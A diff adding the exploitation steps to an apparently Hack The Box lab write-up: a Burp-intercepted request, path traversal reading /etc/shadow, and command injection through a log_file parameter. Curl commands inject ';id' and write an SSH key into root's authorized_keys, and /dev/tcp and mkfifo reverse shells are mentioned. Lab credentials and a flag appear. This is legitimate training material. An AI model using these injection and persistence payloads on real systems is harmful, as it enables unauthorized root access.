@@ -3,7 +3,7 @@
 - **IP:** 10.129.6.48 (originally 10.129.20.143)
 - **OS:** Linux (Ubuntu)
 - **Difficulty:** Easy
-- **Flags:** User ❌ | Root ❌
+- **Flags:** User ✅ | Root ✅
 
 ---
 
@@ -176,12 +176,81 @@ ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
 - **System Management** buttons: `Clean system with apt`, `Update system`, `Clear auth.log`, `Clear access.log`
 - **Analyze Log File** — dropdown (access.log) + Analyze button, reads `/var/log/auth.log`
 
-**Attack vector:** System Management buttons likely execute OS commands as root. Log file analyzer may be vulnerable to command injection or path traversal in the `log_file` parameter.
+**Attack vector:** The `log_file` POST parameter passes a full file path directly into a shell command (likely `grep` or similar) without sanitization.
 
-**Next steps:**
-- [ ] Intercept form submissions (Analyze button, management buttons) to find parameter names
-- [ ] Test command injection in log_file parameter (`;id`, `|id`, etc.)
-- [ ] Test path traversal (`/etc/shadow`, `/root/root.txt`)
+---
+
+## 9) Burp Intercept — Parameter Discovery
+
+Intercepted the "Analyze" POST request in Burp Suite:
+
+```
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+
+log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
+```
+
+**Key findings:**
+- `log_file` = full file path (e.g. `/var/log/apache2/access.log`)
+- `analyze_log` = submit button name (empty value, just needs to be present)
+- The app passes `log_file` directly into a shell command server-side
+
+---
+
+## 10) Path Traversal — Confirmed Root Execution
+
+**Command**
+```bash
+curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
+  -d 'log_file=/etc/shadow&analyze_log='
+```
+
+**Result:** Successfully read `/etc/shadow` — service runs as **root**. Found SHA-512 hashes (`$6$`) for root, amay, and geo.
+
+**But:** Reading `/root/root.txt` returned "No suspicious traffic patterns detected" — the app greps for patterns and the flag (hex string) didn't match any, so content was suppressed.
+
+---
+
+## 11) Command Injection — Root RCE
+
+**Command**
+```bash
+curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
+  -d 'log_file=/root/root.txt;id&analyze_log='
+```
+
+**Result:** The `;` broke out of the shell command. The flag content `3b6e3925cc3ad338dd099ff8ad2f2c5f` leaked in the response because the injected `id` command caused a different code path.
+
+**Why this works:** The PHP code does something like `system("grep 'pattern' " . $log_file)`. The `;` is a bash command separator — it terminates the grep and starts a new command.
+
+---
+
+## 12) Root Shell — SSH Key Injection
+
+Reverse shell attempts kept dying (likely a watchdog or `.bashrc` with `exit`). Used `--norc --noprofile` with mkfifo to get a brief shell, but it wasn't stable.
+
+**Solution: Write SSH public key via command injection**
+
+```bash
+curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
+  --data-urlencode 'log_file=/var/log/apache2/access.log;mkdir -p /root/.ssh;echo ssh-ed25519 AAAAC3... >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys' \
+  -d 'analyze_log='
+```
+
+Then:
+```bash
+ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
+```
+
+**Result:** Stable root SSH shell. Root flag confirmed.
+
+**Troubleshooting notes:**
+- First attempt failed because box rebooted → SSH tunnel died → had to re-establish tunnel before injection would work
+- `bash -i >& /dev/tcp/...` syntax failed via curl (redirect characters getting mangled)
+- `mkfifo` reverse shell connected but died quickly (`.bashrc` exit or watchdog)
+- SSH key injection = most stable approach for persistent root access
 
 ---
 
@@ -194,3 +263,10 @@ ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
 - `ss -tlnp` is the highest-signal privesc check on Linux — reveals internal services invisible to external nmap
 - SSH port forwarding (`-L`) to access internal web apps is a common HTB pattern
 - Password reuse across services (SSH creds → HTTP Basic Auth)
+- Burp Suite intercept is essential — curl guessing parameter names wastes time
+- Path traversal reading a file doesn't mean you see its content — the app may filter/grep the output
+- Command injection with `;` to break out of shell commands — classic unsanitized input
+- Reverse shells can die from `.bashrc` traps — use `--norc --noprofile` or switch to SSH key injection
+- SSH key injection via command injection = stable persistent access when reverse shells are flaky
+- Always check your SSH tunnel is alive after box reboots
+- SHA-512 crypt hashes (`$6$`) = hashcat mode 1800
